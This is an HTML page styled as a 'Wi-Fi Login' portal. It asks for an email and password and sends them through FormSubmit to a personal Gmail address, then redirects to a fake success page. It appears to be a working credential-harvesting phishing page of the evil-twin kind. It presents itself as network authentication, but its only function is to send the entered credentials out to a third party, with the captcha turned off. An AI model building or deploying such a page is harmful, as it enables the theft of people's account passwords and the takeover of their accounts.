<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Wi-Fi Login</title>
  <style>
    body {
      background-color: #f0f2f5;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 30px 40px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }
    h2 {
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    button {
      padding: 10px 20px;
      background: #4285f4;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background: #357ae8;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Wi-Fi Login</h2>
    <form action="https://formsubmit.co/iambillyx15@gmail.com" method="POST">
      <input type="email" name="email" placeholder="Email" required>
      <input type="password" name="password" placeholder="Password" required>

      <input type="hidden" name="_next" value="https://billyx15.github.io/wifi-login/wifi_success.html">

      <!-- Optional: Hide FormSubmit branding -->
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      
      <button type="submit">Connect</button>
    </form>
  </div>
</body>
</html>
